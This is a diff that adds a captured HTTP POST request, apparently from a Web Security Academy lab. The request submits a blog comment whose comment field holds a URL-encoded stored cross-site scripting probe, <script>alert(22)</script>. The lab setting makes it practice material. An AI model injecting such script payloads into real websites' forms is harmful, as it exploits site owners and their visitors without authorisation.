@@ -1,0 +1,20 @@
+POST /post/comment HTTP/1.1
+Host: acf41f4c1e7e59358025097e00d10045.web-security-academy.net
+Connection: close
+Content-Length: 134
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: https://acf41f4c1e7e59358025097e00d10045.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://acf41f4c1e7e59358025097e00d10045.web-security-academy.net/post?postId=2
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: session=Upi0NpUxaLOGlFRwrrR3saYOq4pociHH
+
+csrf=xAQUoN57EYTCqq9EkoroSBiBvAVh1j8j&postId=2&comment=%3Cscript%3Ealert%2822%29%3C%2Fscript%3E&name=lala&email=try%40try.com&website=
